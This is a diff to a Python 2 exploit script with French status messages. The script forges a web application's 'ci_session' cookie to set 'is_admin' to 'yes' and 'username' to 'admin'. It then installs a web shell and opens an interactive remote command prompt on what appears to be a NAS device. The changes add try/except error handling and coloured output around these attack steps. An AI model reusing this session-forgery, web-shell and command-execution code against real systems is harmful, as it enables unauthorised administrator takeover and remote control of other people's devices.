@@ -144,7 +144,7 @@ def get_ci_session():
             if name == 'ci_session' and len(value) > 40:
                 return decode(base64.b64decode(urllib.unquote(value)))
 
-    print " |_[-] Impossible d'etablir une session avec {0}".format(host)
+    print cE + " |_[X] Impossible d'etablir une session avec {0}".format(host)
     sys.exit(1)
 
 def add_string(ci_session, key, value):
@@ -310,11 +310,19 @@ if len(sys.argv) >= 4 and sys.argv[3] == '-c':
     show_admin_cookie(ua)
 else:
     print cM + " |_[-] Configuration de l'acces administrateur: " + cT + "En cours ..."
-    acis = add_string(cis, 'is_admin', 'yes')
+    try:
+    	acis = add_string(cis, 'is_admin', 'yes')
+    except:
+        print cE + "    |_[X] ERREUR: Ce disque semble etre protege :/" + cM + ""
+	quit()
     acis = add_string(acis, 'username', 'admin')
 
     print cM + " |_[-] Installation du web shell:" + cT + " Vas boire un cafe et reviens dans 2mn..."
-    install_shell()
+    try:
+    	install_shell()
+    except:
+        print cE + "    |_[X] ERREUR: Ce disque semble etre protege :/" + cM + ""
+	quit()
 
     print cM + " |_[-] Recuperation de l'id et du hostname: " + cT + "En cours ..."
     try:
@@ -334,4 +342,4 @@ else:
             user_input = raw_input(cM + lcmd + cS)
             running = execute(user_input)
         except:
-            print cE + "[X] ERREUR: Il y a comme de la colle dans les rouages semble t-il :/" + cM + ""
+            print cE + "\n[X] ERREUR: Il y a comme de la colle dans les rouages semble t-il :/" + cM + ""
